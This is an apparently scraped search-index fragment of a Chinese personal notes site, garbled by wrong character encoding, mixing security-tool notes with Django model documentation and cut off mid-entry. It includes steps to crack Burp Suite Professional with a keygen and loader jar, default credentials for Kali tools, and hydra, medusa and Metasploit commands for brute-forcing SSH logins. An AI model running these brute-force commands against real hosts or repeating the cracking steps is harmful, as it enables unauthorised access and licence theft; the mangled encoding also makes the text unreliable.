ä¸‹è½½å®˜æ–¹åŒ… ä¸‹è½½æ³¨å†Œæœº - https://raw.githubusercontent.com/x-Ai/BurpSuite/main/BurpSuiteLoader.jar - https://raw.githubusercontent.com/x-Ai/BurpSuite/main/burp-keygen-scz.jar - æ±‰åŒ–æ–‡ä»¶ ç ´è§£ æ‰“å¼€å®‰è£…åŒ…é•œåƒåï¼Œå°†å®‰è£…æ–‡ä»¶å•ç‹¬æ‹‰å‡ºæ¥ï¼ˆæ‹‰å‡ºæ¥æ‰å¯ä»¥ä¿®æ”¹ï¼‰ å³é”®æ˜¾ç¤ºåŒ…å†…å®¹ è¿›å…¥ Contents/Resources/app ï¼Œ å°†ä¸Šè¿°ä¸‰ä¸ªjaråŒ…å¤åˆ¶è¿›å» ç¼–è¾‘ Contents/Info.plist åœ¨ <string>-Dexe4j.moduleName=$APP_PACKAGE</string> ä¹‹åæ’å…¥ä»¥ä¸‹è¯­å¥: <string>-noverify</string> <string>-javaagent:$APP_PACKAGE/Contents/Resources/app/BurpSuiteLoader.jar</string> å®‰è£…å¥½åå¤åˆ¶ä¸‰ä¸ªæ–‡ä»¶åˆ° /Applications/Burp Suite Enterprise Edition/burp ï¼ˆæœ‰ burpsuite_pro_v2022.8.1.jar çš„ç›®å½•ä¸‹ï¼‰ å®‰è£…æˆåŠŸåä¼šåœ¨åº”ç”¨ç¨‹åºé‡Œæœ‰ä¸€ä¸ªburpçš„æ–‡ä»¶å¤¹ï¼Œä¸åŒç‰ˆæœ¬å¥½åƒåç§°æœ‰å·®å¼‚ å¯åŠ¨: cd /Applications/Burp Suite Enterprise Edition/burp; java -noverify -javaagent:BurpSuiteCnV2.0.jar -javaagent:BurpSuiteLoader.jar -Xmx2048m -jar burpsuite_pro_v2022.8.1.jar æ­¤æ—¶ä¼šæœ‰æç¤ºæ¿€æ´»çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œ æ‰“å¼€ burp-keygen-scz.jar æ³¨å†Œæœºï¼Œæ¥åšç›¸åº”çš„æ¿€æ´» burpsuiteä½¿ç”¨è¯ä¹¦ æ­å»ºburpsuiteæœåŠ¡æ—¶ï¼Œå¯é€‰ä½¿ç”¨è¯ä¹¦ ç¯å¢ƒ/å·¥å…· MacOS 12.5 openssl æ­¥éª¤, éƒ¨åˆ†å¯å‚è€ƒ /docs/å®‰å…¨/ç”ŸæˆTLS(SSL)è¯ä¹¦ : # ç”Ÿæˆrsaç§é’¥ï¼Œdes3ç®—æ³•ï¼Œ1024ä½å¼ºåº¦ï¼Œssl.keyæ˜¯ç§˜é’¥æ–‡ä»¶åã€‚ openssl genrsa -des3 -out ssl.key 1024 # æ ¹æ®æç¤ºè¾“å…¥å¯†ç ã€‚å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆä¸€ä¸ª ssl.key æ–‡ä»¶ã€‚ # åˆ é™¤å¯†ç ã€‚ # è¿™é‡Œç›®å½•å’Œç”Ÿæˆç§é’¥çš„ç›®å½•ä¸€è‡´ openssl rsa -in ssl.key -out ssl.key # ç”Ÿæˆ CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰ã€‚æ ¹æ®æ ¹æ®åˆšåˆšç”Ÿæˆçš„ key æ–‡ä»¶æ¥ç”Ÿæˆè¯ä¹¦è¯·æ±‚æ–‡ä»¶ openssl req -new -key ssl.key -out ssl.csr # ä¾æ¬¡è¾“å…¥å›½å®¶ã€åœ°åŒºã€åŸå¸‚ã€ç»„ç»‡ã€ç»„ç»‡å•ä½ã€Common Nameã€Email å’Œå¯†ç ã€‚å…¶ä¸­ Common Name åº”è¯¥ä¸åŸŸåä¿æŒä¸€è‡´ã€‚å¯†ç æˆ‘ä»¬å·²ç»åˆ æ‰äº†,ç›´æ¥å›è½¦å³å¯ã€‚ # æç¤ºï¼šCommon Name å°±æ˜¯è¯ä¹¦å¯¹åº”çš„åŸŸååœ°å€ï¼Œæˆ‘ä»¬å¼€å‘å¾®ä¿¡å°ç¨‹åºæ—¶å¿…é¡»è¦è®©æˆ‘ä»¬çš„å¤–é“¾çš„ https çš„åŸŸåå’Œè¯ä¹¦ç»Ÿä¸€æ‰è¡Œã€‚ # ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ã€‚æ ¹æ®ä»¥ä¸Š 2 ä¸ªæ–‡ä»¶ç”Ÿæˆ crt è¯ä¹¦æ–‡ä»¶ï¼Œç»ˆç«¯æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š # è¿™é‡Œ3650æ˜¯è¯ä¹¦æœ‰æ•ˆæœŸ(å•ä½ï¼šå¤©)ã€‚è¿™ä¸ªå¤§å®¶éšæ„ã€‚æœ€åä½¿ç”¨åˆ°çš„æ–‡ä»¶æ˜¯keyå’Œcrtæ–‡ä»¶ã€‚ openssl x509 -req -days 3650 -in ssl.csr -signkey ssl.key -out ssl.crt # åˆ°è¿™é‡Œæˆ‘ä»¬çš„è¯ä¹¦(ssl.key å’Œ ssl.crt) å°±å·²ç»åˆ›å»ºæˆåŠŸäº†å¯ä»¥ç›´æ¥ç”¨åˆ° https çš„ server ä¸­äº†ã€‚ # åœ¨ä»£ç ä¸­ä½¿ç”¨è¯ä¹¦ï¼š https .createServer( { key: fs.readFileSync(\"./cert_key/ssl.key\"), cert: fs.readFileSync(\"./cert_key/ssl.crt\") }, app ) .listen(1993);","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-brup-Tool-Burpsuite.html","loc":"/yq-doc-source-docs-Safety-brup-Tool-Burpsuite.html"},{"title":"macosä½¿ç”¨brup","text":"å®‰è£…è¿‡ç¨‹æš‚ä¸è¡¨è¿°, ä¸»è¦æ˜¯å·²ç»å¿˜äº† è¯ä¹¦é…ç½® ç³»ç»Ÿ: macOS 13 æ‰“å¼€burpè®¾ç½®ä»£ç†åœ°å€ è®¾ç½®åœ°å€: 127.0.0.1:9998 è®¾ç½®æµè§ˆå™¨ä»£ç†åœ°å€ è¿›å…¥è·¯å¾„ä¸º ç³»ç»Ÿè®¾ç½® -> wifi -> è¯¦ç»†ä¿¡æ¯ -> ç½‘é¡µä»£ç† æˆ–è€…æ‰“å¼€safari -> åå¥½è®¾ç½® -> é«˜çº§ -> ä»£ç† httpå’Œhttpséƒ½å¯ä»¥è®¾ç½®å¥½ æµè§ˆå™¨æ‰“å¼€è¯¥åœ°å€ä¸‹è½½è¯ä¹¦ ç‚¹å‡»å³ä¸Šè§’ä¸‹è½½è¯ä¹¦(å¯ä»¥é‡å‘½å) å¯¼å…¥è¯ä¹¦ comman + space æ‰“å¼€æœç´¢, æ‰¾åˆ° é’¥åŒ™ä¸²è®¿é—® å¹¶æ‰“å¼€, è¿›å…¥ ç™»å½• -> è¯ä¹¦ è¿›å…¥ ç™»å½• -> è¯ä¹¦ å°†ä¸‹è½½å¥½çš„è¯ä¹¦æ‹–åŠ¨åˆ°æ­¤é¡µé¢, å¹¶è®¾ç½®ä¸ºå§‹ç»ˆä¿¡ä»»(é€‰ä¸­å³é”® -> æ˜¾ç¤ºç®€ä»‹ -> å§‹ç»ˆä¿¡ä»») ä¹‹åå°±å¯ä»¥åœ¨burpè¿›è¡Œæ‹¦æˆªäº†.","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-brup-macos-uses-brup.html","loc":"/yq-doc-source-docs-Safety-brup-macos-uses-brup.html"},{"title":"Kaliå®‰è£…ã€é…ç½®","text":"ä¸‹è½½åœ°å€ , é€‰æ‹©è‡ªå·±åˆé€‚çš„ç‰ˆæœ¬ä¸‹è½½å³å¯ï¼Œä¸‹è½½åï¼Œç›´æ¥è§£å‹æ‰“å¼€ï¼ˆéœ€æå‰å‡†å¤‡å¥½ç¯å¢ƒå¦‚è™šæ‹Ÿæœºï¼‰ é»˜è®¤è´¦æˆ·å¯†ç : kali kali # æ—§ç‰ˆæœ¬æ˜¯ root è·Ÿ toor ä¸€äº›å…¶ä»–å·¥å…·é»˜è®¤è´¦å¯† BeEF-XSS: Username: beef Password: beef Configuration File: /etc/beef-xss/config.yaml MySQL: User: root Password: (blank) Setup Program: mysql_secure_installation OpenVAS: Username: admin Password: <Generated during setup> Setup Program: openvas-setup Metasploit-Framework: Username: postgres Password: postgres Configuration File: /usr/share/metasploit-framework/config/database.yml å‚è€ƒï¼š https://www.kali.org/docs/introduction/default-credentials/ æ¢æº # å¤‡ä»½ mv /etc/apt/sources.list /etc/apt/sources.list.bak # å†™å…¥ echo \"deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib \" >/etc/apt/sources.list å®‰è£…vim, ssh apt update apt install vim ssh å¯åŠ¨ssh # æˆ–è€… service ssh start /etc/init.d/ssh start # å¯ä»¥é€šè¿‡ netstat -anutp æŸ¥çœ‹æ˜¯å¦åœ¨ç›‘å¬22ç«¯å£ # è®¾ç½®å¼€æœºå¯åŠ¨ update-rc.d ssh enable","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-installation-configuration.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-installation-configuration.html"},{"title":"hydra","text":"æš´åŠ›ç ´è§£å¸å¯† ç¤ºä¾‹ # usernameå­˜æ”¾åœ¨username.txt # passwordå­˜æ”¾åœ¨pwd.txt # ä»¥sshå½¢å¼ç ´è§£192.168.135.123å¸å¯† hydra -L username.txt -P pwd.txt 192 .168.135.123 ssh æ³¨è§£ æˆ–è€…è¿˜æ˜¯ä½¿ç”¨msfconsole msfconsole use auxiliary/scanner/ssh/ssh_login set RHOSTS 192 .168.135.123 set PASS_FILE password.txt set USER_FILE username.txt exploit çˆ†ç ´ssh: hydra -L ç”¨æˆ·åæ–‡ä»¶ -P ç”¨æˆ·å¯†ç æ–‡ä»¶ IPåœ°å€ ssh","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Hydra.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Hydra.html"},{"title":"maltego","text":"","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Maltego.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Maltego.html"},{"title":"nc","text":"","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Nick-name.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Nick-name.html"},{"title":"tor","text":"ä½¿ç”¨ä»£ç†ä¼ªè£… éœ€è¦å…ˆaptå®‰è£…: apt install tor é…ç½®æ–‡ä»¶åœ¨: /etc/proxychains4.conf","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Tor.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Tor.html"},{"title":"dirb","text":"æœåŠ¡ç›®å½•æ‰«æ ç¤ºä¾‹ â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$ dirb http://www.coolshell.cn ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Mon Jan 2 17 :59:28 2023 URL_BASE: http://www.coolshell.cn/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://www.coolshell.cn/ ---- ( ! ) WARNING: NOT_FOUND [] not stable, unable to determine correct URLs { 30X } . ( Try using FineTunning: '-f' ) ----------------- END_TIME: Mon Jan 2 17 :59:29 2023 DOWNLOADED: 0 - FOUND: 0 â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-dirb.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-dirb.html"},{"title":"exiftool","text":"æŸ¥çœ‹æ–‡ä»¶æ³¨é‡Š","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-exifTool.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-exifTool.html"},{"title":"fcrackzip","text":"zipåŒ…çš„çˆ†ç ´ é€‰é¡¹: -D â€˜å­—å…¸' å­—å…¸ç ´è§£æ–¹å¼ -b æš´åŠ›ç ´è§£æ–¹å¼ -c æš´åŠ›ç ´è§£çš„å­—ç¬¦ç±»å‹ï¼Œ1=1~9,a=a~z,A=A~Z,!=å­—ç¬¦,:=æ‰€æœ‰å­—ç¬¦ -v å•°å—¦æ¨¡å¼ï¼Œæ˜¾ç¤ºå®æ—¶çˆ†ç ´ä¿¡æ¯ -l æŒ‡å®šç ´è§£çš„å¯†ç ä¸ºå‡ ä½æ•° -u æŒ‡å®šçˆ†ç ´æ–‡ä»¶ -p ç ´è§£çš„èµ·å§‹ä½ç½®","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-fcrackzip.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-fcrackzip.html"},{"title":"medusa","text":"æš´åŠ›ç ´è§£å¸å¯† ç¤ºä¾‹ # passwordå­˜æ”¾åœ¨pwd.txt # ä»¥sshå½¢å¼ç ´è§£192.168.135.123å¸å¯† medusa -M ssh -h 192 .168.135.123 -u root -P pwd.txt","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-medusa.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-medusa.html"},{"title":"nikto","text":"","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nikto.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nikto.html"},{"title":"shodan","text":"IPåœ°å€ä¿¡æ¯æ”¶é›†","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-shodan.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-shodan.html"},{"title":"sqlmap","text":"æ¸—é€æ•°æ®åº“","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-sqlmap.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-sqlmap.html"},{"title":"strings","text":"ä»¥å­—ç¬¦ä¸²å½¢å¼ æŸ¥çœ‹å›¾ç‰‡","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-strings.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-strings.html"},{"title":"wfuzz","text":"çˆ†ç ´","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wFuzz.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wFuzz.html"},{"title":"whois","text":"åŸŸåæ³¨å†Œä¿¡æ¯æ”¶é›† æœç´¢ baidu.com ç›¸å…³ä¿¡æ¯: â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ whois baidu.com Domain Name: BAIDU.COM Registry Domain ID: 11181110_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.markmonitor.com Registrar URL: http://www.markmonitor.com Updated Date: 2022-09-01T03:54:43Z Creation Date: 1999-10-11T11:05:17Z Registry Expiry Date: 2026-10-11T11:05:17Z Registrar: MarkMonitor Inc. Registrar IANA ID: 292 Registrar Abuse Contact Email: abusecomplaints@markmonitor.com Registrar Abuse Contact Phone: +1.2086851750 Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited Name Server: NS1.BAIDU.COM Name Server: NS2.BAIDU.COM Name Server: NS3.BAIDU.COM Name Server: NS4.BAIDU.COM Name Server: NS7.BAIDU.COM DNSSEC: unsigned ...","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-whois.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-whois.html"},{"title":"wpscan","text":"æ¼æ´æ‰«æ","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wpscan.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wpscan.html"},{"title":"Mac M1 Pro å®‰è£… Kali","text":"ä¸‹è½½åœ°å€ Kali Installer Kali ä¸‹è½½ä½ç½® å®‰è£… ä½¿ç”¨çš„å·¥å…·æ˜¯ Vmware Fusion 13 , å¯ä»¥ç”³è¯·å…è´¹è®¸å¯è¯ä½¿ç”¨. æ³¨æ„å®‰è£…çš„æ—¶å€™é€‰æ‹© Debain å³å¯. é€‰æ‹© Debian 12 ç»“æŸ å®‰è£…è¿‡ç¨‹ç•¥è¿‡, ä¸€è·¯ç‚¹å°±è¡Œ. æ³¨æ„å› ä¸ºæ˜¯å®‰è£…å™¨æ‰‹åŠ¨å®‰è£…, æ‰€ä»¥éœ€è¦è‡ªå·±è®¾ç½®ç”¨æˆ·åä¸å¯†ç . ä¸ä»¥å‰ intel ç›´æ¥ä¸‹è½½è™šæ‹Ÿæœºç‰ˆæœ¬ç‚¹å¼€å³ç”¨çš„æ–¹å¼ä¸ä¸€æ ·.","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Mac-M1-installation-Kali.html","loc":"/yq-doc-source-docs-Safety-kali-Mac-M1-installation-Kali.html"},{"title":"å†…éƒ¨ç±»Meta","text":"å¯ç”¨çš„é€‰é¡¹ abstract abstract = Trueï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª /docs/åç«¯/python/Webæ¡†æ¶/Django/æŠ½è±¡åŸºç±» app_label å¦‚æœåœ¨ INSTALLED_APPS ä¸­å®šä¹‰äº†ä¸€ä¸ªåº”ç”¨ç¨‹åºä¹‹å¤–çš„æ¨¡å‹ï¼Œå®ƒå¿…é¡»å£°æ˜å®ƒå±äºå“ªä¸ªåº”ç”¨ç¨‹åº: app_label = 'myapp' å¦‚æœä½ æƒ³ç”¨ app_label.object_name æˆ– app_label.model_name æ¥è¡¨ç¤ºä¸€ä¸ªæ¨¡å‹ï¼Œä½ å¯ä»¥åˆ†åˆ«ä½¿ç”¨: model._meta.label æˆ– model._meta.label_lower db_table ç”¨äºæ¨¡å‹çš„æ•°æ®åº“è¡¨çš„åç§° base_manager_name ç®¡ç†å™¨çš„å±æ€§å ç®¡ç†å™¨çš„å±æ€§åï¼Œä¾‹å¦‚ï¼Œ'objects'ï¼Œç”¨äºæ¨¡å‹çš„ _base_managerã€‚ è¯´å®è¯ æ²¡æ‡‚ db_tablespace æ•°æ®åº“è¡¨ç©ºé—´åç§° è¡¨ç©ºé—´ï¼ˆTablespacesï¼‰ | Django æ–‡æ¡£ | Django (djangoproject.com) default_manager_name æ¨¡å‹çš„ç®¡ç†å™¨åç§° æ¨¡å‹çš„ _default_manager ç®¡ç†å™¨åç§°ã€‚ default_related_name ä»ç›¸å…³å¯¹è±¡åˆ°è¿™ä¸ªå¯¹è±¡çš„å…³ç³»é»˜è®¤ä½¿ç”¨çš„åç§°ã€‚é»˜è®¤ä¸º _set ã€‚ è¿™ä¸ªé€‰é¡¹è¿˜å¯ä»¥è®¾ç½® related_query_name ç”±äºå­—æ®µçš„åå‘åç§°åº”è¯¥æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥å¦‚æœä½ æ‰“ç®—å¯¹ä½ çš„æ¨¡å‹è¿›è¡Œå­ç±»åŒ–ï¼Œå°±è¦å°å¿ƒäº†ã€‚ ä¸ºäº†é¿å…åç§°å†²çªï¼Œåç§°çš„ä¸€éƒ¨åˆ†åº”è¯¥åŒ…å« '%(app_label)s' å’Œ '%(model_name)s' ï¼Œ å®ƒä»¬åˆ†åˆ«è¢«æ¨¡å‹æ‰€åœ¨çš„åº”ç”¨ç¨‹åºçš„åç§°å’Œæ¨¡å‹çš„åç§°æ‰€å–ä»£ï¼Œéƒ½æ˜¯å°å†™çš„ã€‚ è§ æŠ½è±¡æ¨¡å‹çš„ç›¸å…³åç§° æ®µè½ã€‚ get_latest_by æ¨¡å‹ä¸­çš„å­—æ®µåæˆ–å­—æ®µååˆ—è¡¨ æˆ‘çš„ç†è§£æ˜¯ ä»¥è¿™ä¸ªå­—æ®µé›†è¿›è¡Œæ’åº managed é»˜è®¤ä¸ºTrueï¼Œè¡¨ç¤ºDjango ç®¡ç† æ•°æ®åº“è¡¨çš„ç”Ÿå‘½å‘¨æœŸã€‚ å¦‚æœ Falseï¼Œå°†ä¸å¯¹è¯¥æ¨¡å‹è¿›è¡Œæ•°æ®åº“è¡¨çš„åˆ›å»ºã€ä¿®æ”¹æˆ–åˆ é™¤æ“ä½œã€‚ å¦‚æœè¯¥æ¨¡å‹ä»£è¡¨ä¸€ä¸ªç°æœ‰çš„è¡¨æˆ–ä¸€ä¸ªé€šè¿‡å…¶ä»–æ–¹å¼åˆ›å»ºçš„æ•°æ®åº“è§†å›¾ï¼Œè¿™ä¸€ç‚¹å¾ˆæœ‰ç”¨ã€‚ è¿™æ˜¯åœ¨ managed=False æ—¶ å”¯ä¸€ çš„åŒºåˆ«ã€‚æ¨¡å‹å¤„ç†çš„æ‰€æœ‰å…¶ä»–æ–¹é¢éƒ½ä¸æ­£å¸¸æƒ…å†µå®Œå…¨ç›¸åŒã€‚ order_with_respect_to ä½¿è¯¥å¯¹è±¡å¯ä»¥æ ¹æ®ç»™å®šå­—æ®µï¼ˆé€šå¸¸æ˜¯ ForeignKey ï¼‰è¿›è¡Œæ’åºã€‚ ordering å¯¹è±¡çš„é»˜è®¤æ’åº permissions è¡¨çš„é¢å¤–æƒé™ åˆ›å»ºæ­¤å¯¹è±¡æ—¶è¦è¾“å…¥æƒé™è¡¨çš„é¢å¤–æƒé™ã€‚ä¸ºæ¯ä¸ªæ¨¡å‹è‡ªåŠ¨åˆ›å»ºæ·»åŠ ã€æ›´æ”¹ã€åˆ é™¤å’ŒæŸ¥çœ‹æƒé™ã€‚ è¿™ä¸ªä¾‹å­æŒ‡å®šäº†ä¸€ä¸ªé¢å¤–çš„æƒé™ï¼Œcan_deliver_pizzas permissions = [('can_deliver_pizzas', 'Can deliver pizzas')] è¿™æ˜¯ä¸€ä¸ªç”±äºŒå…ƒå…ƒç»„ç»„æˆçš„åˆ—è¡¨æˆ–å…ƒç»„ï¼Œæ ¼å¼ä¸º (permission_code, human_readable_permission_name)ã€‚ default_permissions é»˜è®¤å€¼ä¸º ('add', 'change', 'delete', 'view') ã€‚ ä½ å¯ä»¥è‡ªå®šä¹‰è¿™ä¸ªåˆ—è¡¨ï¼Œä¾‹å¦‚ï¼Œå¦‚æœä½ çš„åº”ç”¨ä¸éœ€è¦ä»»ä½•é»˜è®¤çš„æƒé™ï¼Œå¯ä»¥å°†å…¶è®¾ç½®ä¸ºç©ºåˆ—è¡¨ã€‚ å®ƒå¿…é¡»åœ¨æ¨¡å‹åˆ›å»ºä¹‹å‰é€šè¿‡ migrate åœ¨æ¨¡å‹ä¸ŠæŒ‡å®šï¼Œä»¥é˜²æ­¢ä»»ä½•é—æ¼çš„æƒé™è¢«åˆ›å»ºã€‚ proxy å¦‚æœ proxy = True ï¼Œä½œä¸ºå¦ä¸€ä¸ªæ¨¡å‹å­ç±»çš„æ¨¡å‹å°†è¢«è§†ä¸º ä»£ç†æ¨¡å‹ required_db_features å½“å‰è¿æ¥åº”å…·å¤‡çš„æ•°æ®åº“ç‰¹å¾åˆ—è¡¨ï¼Œä»¥ä¾¿åœ¨è¿ç§»é˜¶æ®µè€ƒè™‘æ¨¡å‹ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ å°†æ­¤åˆ—è¡¨è®¾ç½®ä¸º ['gis_enabled']ï¼Œåˆ™æ¨¡å‹å°†åªåœ¨æ”¯æŒ GIS çš„æ•°æ®åº“ä¸ŠåŒæ­¥ã€‚ åœ¨ä½¿ç”¨å¤šä¸ªæ•°æ®åº“åç«¯è¿›è¡Œæµ‹è¯•æ—¶ï¼Œè·³è¿‡ä¸€äº›æ¨¡å‹ä¹Ÿå¾ˆæœ‰ç”¨ã€‚é¿å…æ¨¡å‹ä¹‹é—´çš„å…³ç³»ï¼Œ è¿™äº›æ¨¡å‹å¯èƒ½ä¼šè¢«åˆ›å»ºï¼Œä¹Ÿå¯èƒ½ä¸ä¼šè¢«åˆ›å»ºï¼Œå› ä¸º ORM ä¸ä¼šå¤„ç†è¿™ä¸ªé—®é¢˜ã€‚ required_db_vendor æœ¬æ¨¡å‹æ‰€ç‰¹æœ‰çš„æ”¯æŒçš„æ•°æ®åº“å‚å•†åç§°ã€‚ç›®å‰çš„å†…ç½®å‚å•†åç§°æ˜¯ï¼š sqlite ï¼Œ postgresql ï¼Œ mysql å’Œ oracle ã€‚ å¦‚æœè¯¥å±æ€§ä¸ä¸ºç©ºï¼Œä¸”å½“å‰è¿æ¥å‚å•†ä¸ä¹‹ä¸åŒ¹é…ï¼Œåˆ™è¯¥æ¨¡å‹å°†ä¸ä¼šåŒæ­¥ã€‚ select_on_save ç¡®å®š Django æ˜¯å¦ä¼šä½¿ç”¨ 1.6 ä¹‹å‰çš„ django.db.models.Model.save() ç®—æ³•. æ—§çš„ç®—æ³•ä½¿ç”¨ SELECT æ¥ç¡®å®šæ˜¯å¦æœ‰ä¸€æ¡ç°æœ‰çš„è®°å½•éœ€è¦æ›´æ–°ã€‚ æ–°ç®—æ³•ç›´æ¥å°è¯• UPDATE ã€‚åœ¨ä¸€äº›ç½•è§çš„æƒ…å†µä¸‹ï¼ŒDjango çœ‹ä¸åˆ°ç°æœ‰è¡Œçš„ UPDATE ã€‚ ä¾‹å¦‚ PostgreSQL çš„ ON UPDATE è§¦å‘å™¨ä¼šè¿”å› NULL ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿æ•°æ®åº“ä¸­å­˜åœ¨ä¸€æ¡è®°å½•ï¼Œæ–°ç®—æ³•æœ€ç»ˆä¹Ÿä¼šè¿›è¡Œ INSERT ã€‚ é€šå¸¸ä¸éœ€è¦è®¾ç½®è¿™ä¸ªå±æ€§ã€‚é»˜è®¤å€¼æ˜¯ False ã€‚ å…³äºæ–°æ—§ä¿å­˜ç®—æ³•ï¼Œè¯·å‚è§ django.db.models.Model.save() indexes å®šä¹‰ç´¢å¼•åˆ—è¡¨ å¦‚: from django.db import models class Customer(models.Model): first_name = models.CharField(max_length=100) last_name = models.CharField(max_length=100) class Meta: indexes = [ models.Index(fields=['last_name', 'first_name']), models.Index(fields=['first_name'], name='first_name_idx'), ] unique_together ä¸€ç»„å­—æ®µåï¼Œç»„åˆèµ·æ¥å¿…é¡»æ˜¯å”¯ä¸€çš„ index_together å¯ä»¥ç†è§£ä¸ºè”åˆç´¢å¼• constraints è¡¨çº¦æŸ verbose_name å¯¹è±¡çš„æ³¨é‡Š å•æ•° verbose_name_plural å¯¹è±¡çš„å¤æ•°ï¼Œé»˜è®¤æ˜¯ä¸Šä¸€ä¸ªåŠ s label å¯¹è±¡çš„è¡¨ç¤ºï¼Œè¿”å› app_label.object_nameï¼Œä¾‹å¦‚ 'polls.Question'ã€‚ label_lower æ¨¡å‹çš„è¡¨ç¤ºï¼Œè¿”å› app_label.model_nameï¼Œä¾‹å¦‚ 'polls.question'ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Internal-class-meta.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Internal-class-meta.html"},{"title":"CharField","text":"ä¸€ä¸ªå­—ç¬¦ä¸²å­—æ®µï¼Œé€‚ç”¨äºå°åˆ°å¤§çš„å­—ç¬¦ä¸²ã€‚ å¯¹äºå¤§é‡çš„æ–‡æœ¬ï¼Œä½¿ç”¨ /docs/åç«¯/python/Webæ¡†æ¶/Django/æ”¯æŒçš„Field/TextField è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª TextInputã€‚ CharField æœ‰ä¸¤ä¸ªé¢å¤–çš„å‚æ•°ï¼š CharField.max_length å¿…é¡»çš„ã€‚è¯¥å­—æ®µçš„æœ€å¤§é•¿åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½ï¼‰ã€‚ max_length åœ¨æ•°æ®åº“å±‚é¢å¼ºåˆ¶æ‰§è¡Œï¼Œåœ¨ Django çš„éªŒè¯ä¸­ä½¿ç”¨ MaxLengthValidatorã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Charfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Charfield.html"},{"title":"FieldFile","text":"æ­¤èŠ‚ä»…è¯´æ˜ä¸FileFieldå…³ç³», å¹¶ä¸å­˜åœ¨è¿™æ ·ä¸€ä¸ªåˆ—, /docs/åç«¯/python/Webæ¡†æ¶/Django/æ”¯æŒçš„Field/FileField å’Œ FieldFile å½“ä½ è®¿é—®ä¸€ä¸ªæ¨¡å‹ä¸Šçš„ FileField æ—¶ï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ª FieldFile çš„å®ä¾‹ä½œä¸ºè®¿é—®åº•å±‚æ–‡ä»¶çš„ä»£ç†: class FieldFile FieldFile çš„ API ä¸ File çš„ API 